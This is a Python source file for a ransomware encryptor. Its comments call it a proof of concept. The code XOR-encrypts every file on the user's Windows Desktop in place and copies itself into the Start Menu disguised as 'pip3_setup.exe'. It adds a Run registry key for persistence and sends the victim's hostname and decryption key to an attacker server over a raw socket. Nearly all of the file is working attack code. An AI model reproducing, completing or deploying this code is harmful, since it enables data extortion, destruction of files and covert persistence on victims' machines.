import socket
import os
import threading
import queue
import random
import shutil
import sys
import subprocess

# 1st program = encryptor
# To encrypt all the file at a given directory and transmit
# the user's hostname & random 512 bit key back to the malware server

# 2nd program = decryptor that will ask the user for they key
# generated on their machine
# Only the attacker will have this key, thus victims must retrieve this key from attackers

# We're NOT using AES encrpytion, cuz this is just a Proof of Concept
# NOT a real-world attack :)

# Encrypting function that threads will run
# Passing key as an argument
def encrypt(key):
    # Infinite loop
    while True:
        file = q.get()
        print(f'Encrypting {file}')
        try:
            # 1st index = 0
            key_index = 0
            # Last index = (length of key) - 1
            max_key_index = len(key) - 1
            # empty encrypted_data preparing to store data
            encrypted_data = ''
            
            # Windows rw => 'rb'
            # Linux rw => 'r+b'
            with open(file, 'rb') as f:
                data = f.read()
            
            # write permission
            with open(file, 'w') as f:
                f.write('')
                
            # Loop through each byte in data
            for byte in data:
                # For Byte operations (XOR) in Python
                # https://stackoverflow.com/questions/29408173/byte-operations-xor-in-python
                
                # ord() => Converts a single Unicode character into its integer representation
                # Explanation
                # Each CHAR / INT has its own Unicode
                # e.g. 
                # Unicode | INT
                # 0       | 48
                # 1       | 49
                # 9       | 57
                # a       | 97
                # b       | 98
                # z       | 122
                
                # sample code to get Unicode of each CHAR in a String
                # name = 'InfoEdge'
                # for char in name:
                #   print(f'Char: ', char)
                #   print(f'Unicode: ', ord(char))
                #
                # Outputs
                # Unicode  | CHAR
                # 73       | I
                # 110      | n
                # 102      | f
                # 111      | o
                # 69       | E
                # 100      | d
                # 103      | g
                # 101      | e
                
                # Vice Versa, Converting Unicode to CHAR/INT
                # unicode = [65, 97, 36, 57]
                # for each in unicode:
                #   print(f'Each Unicode: ', each, f'CHAR/INT :', chr(i))
                # Unicode  | CHAR/INT
                # 65       | A
                # 97       | a
                # 36       | $
                # 57       | 9
                
                # chr() range: 0 - 1,114,111 ONLY
                # out of range cannot be converted
                # https://www.shiksha.com/online-courses/articles/ord-and-chr-functions-in-python/#:~:text=ord()%20function%20in%20Python%20is%20used%20to%20convert%20a,the%20character)%20as%20an%20output.
                xor_byte = byte ^ ord(key[key_index])
                
                # Open a file for Appending in binary mode
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                
                # Increment key index
                # if key_index excceeds len(key) - 1
                # Reset key_index = 0
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    # if key_index is in range, += 1
                    key_index += 1
            print(f'{file} successfully encrypted')
        except:
            print(f'Failed to encrypt {file} :(')
        q.task_done()

# Socket information
IP_ADDRESS = '192.168.31.138'
PORT = 5678
#IP_ADDRESS = input('Enter Server IP [e.g. 192.168.31.168]: ')
#PORT = input('Server Port [5678]: ')
#PORT = int(PORT)

# Encryption information
ENCRYPTION_LEVEL = 512 // 8 # 512 bit encryption = 64 bytes

key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}\|'

key_char_pool_len = len(key_char_pool)

# Grab Filepaths to encrypt
print("Preparing files...")

# Locating C:\Users\USER\Desktop
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'

# Listing C:\User\USER\Desktop
files = os.listdir(desktop_path)

# Creating an empty preparing to store abs files
abs_files = []

for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        # If conditions met, store C:\Users\USER\Desktop\eachFile to abs_files[]
        abs_files.append(f'{desktop_path}\\{f}')
print('Successfully located all files!')

# Grab clients hostnames
hostname = os.getenv('COMPUTERNAME')

# Generate Encryption Key
print('Generating encryption key...')

key = ''
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]
print('Key has been generated!') 

# ============= Gaining persistency
# A common C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Programs\pip3_setup.exe ;)
location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\pip3_setup.exe"

# If 'location' does NOT exist, it's 1st time running this Backdoor client

if not os.path.exists(location):
#     # Performing copying action of our Backdoor.exe to User's /AppData
      shutil.copyfile(sys.executable, location)
#     # Allow users to proactively connect to our backdoor server
#     # whenever they login to their machines
#     #
#     # Appending machine startup .exe permissions to Victims' Windows regkey at
#     # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
#     # /v = Name; /t = Type; /d = Data
      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v pip3 /t REG_SZ /d "' + location + '"', shell=True)
else:
    # Otherwise, just jump to steps below
    #sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # ==========================================
    # port = 54321
    #sock.connect((IP_ADDRESS, port))
    #print(f'Connection Established to Server!')
    #shell()
    # ==========================================
    #connection()
    #answer = "Server: Hello Back!"
    #sock.send(answer.encode())
    #sock.close()
    
    # Connect to server to transfer key and hostname
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IP_ADDRESS, PORT))
        print('Successfully connected...')
        print('Transmitting hostname and Key')
        s.send(f'{hostname} : {key}'.encode('utf-8'))
        print('Done transmitting data!')
        # Close socket when done
        s.close()
# ============= Gaining persistency

# Store files into a queue for threads to handle
# Enabling multi-threading to speed up the encryption/decryption process
# In case the user had a bunch of files
q = queue.Queue()
# Each file in abs_files[]
for f in abs_files:
    # Put eachFile into queue
    q.put(f)
    
# Setup threads to get ready for encryption :)
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Encryption and upload complete!!! :D')
input()